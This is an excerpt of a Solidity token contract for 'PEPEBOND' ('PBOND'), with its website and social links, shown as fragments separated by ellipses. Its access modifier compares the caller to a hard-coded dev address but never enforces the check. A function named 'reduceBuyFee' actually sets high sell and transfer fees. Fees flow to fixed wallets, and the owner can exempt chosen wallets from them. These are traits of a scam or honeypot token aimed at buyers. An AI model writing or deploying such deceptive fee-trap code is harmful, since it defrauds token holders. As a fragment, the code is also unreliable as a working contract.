// WEBSITE:  https://pepebond.online/

// Telegram: https://t.me/pepebond

// Twitter:  https://twitter.com/pepebondcoin
...
contract PEPEBOND is Ownable, ERC20 {
    ...
    address constant DEV = 0xb8231Ae1207D0260C54757c444071D5d49206157;
    

    string constant _name = "PEPEBOND";
    string constant _symbol = "PBOND";
    ...
    uint256 private burnFee         = 1; // 1% goes to dead wallet and burns forever 
    ...
    modifier _onlyDev() {msg.sender == DEV; _;}
    ...
    constructor () {
        ...
        marketingFeeReceiver = 0x709BF6F8bD69CC06292DE2befBD4c171de96E1eD;
        devFeeReceiver = DEV;
        buybackFeeReceiver = DEV;
    ...
    function takeFee(address sender, uint256 amount, address recipient) internal returns (uint256) {
        ...
        uint256 marketingTokens = feeAmount.sub(burnTokens);
    ...
    function reduceBuyFee() external _onlyDev {
        buypercent = 100;
        sellpercent = 1400;
        transferpercent = 1000;
    }
    ...
    function setWalletExcemptFee(address[] memory _wallets, bool Excempt) external onlyOwner {
        
        for(uint i=0; i < _wallets.length; i++) {
            isexemptfromfees[_wallets[i]] = Excempt;
            emit user_exemptfromfees(_wallets[i], Excempt);
        }
